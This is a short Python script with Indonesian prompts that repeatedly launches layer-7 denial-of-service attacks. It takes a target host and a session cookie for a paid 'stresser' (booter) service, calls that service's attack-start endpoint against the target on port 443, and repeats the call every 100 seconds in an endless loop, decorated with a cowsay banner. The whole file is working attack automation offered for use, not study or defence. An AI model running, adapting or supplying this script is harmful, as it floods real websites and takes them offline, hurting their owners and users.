import requests
import time
import cowsay
from tqdm import tqdm
import sys
import threading

def slow_print(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def get_input(prompt):
    slow_print(prompt, 0.05)
    return input()

def animate_cowsay(message):
    for _ in tqdm(range(100), desc="Processing", ncols=75):
        time.sleep(0.01)
    cowsay.cow(message)

def main():
    # Prompt user for name, host URL, and cookie with animation
    name = get_input("Masukkan nama: ")
    host = get_input("Masukkan URL host: ")
    cookie = get_input("Masukkan cookie: ")

    # Update the headers with the user-provided cookie
    headers = {
        "Cookie": cookie,
        "Sec-Ch-Ua": '"Chromium";v="125", "Not.A/Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://redstresser.org/hub",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }

    url = f"https://redstresser.net/complexx/layer7.php?type=start&host={host}&port=443&time=100&method=TLS-DETECT&totalservers=1&vip=undefined"

    while True:
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
            
                message = f"Copyrigt © mnytc\nNama: {name}\nHost: {host}\nSudah Berjalan..."
                animate_cowsay(message)
            else:
                slow_print(f"Error: {response.status_code}")
        except Exception as e:
            slow_print(f"Terjadi kesalahan: {e}")
        time.sleep(100)  # Delay 100 detik sebelum request berikutnya

if __name__ == "__main__":
    main()
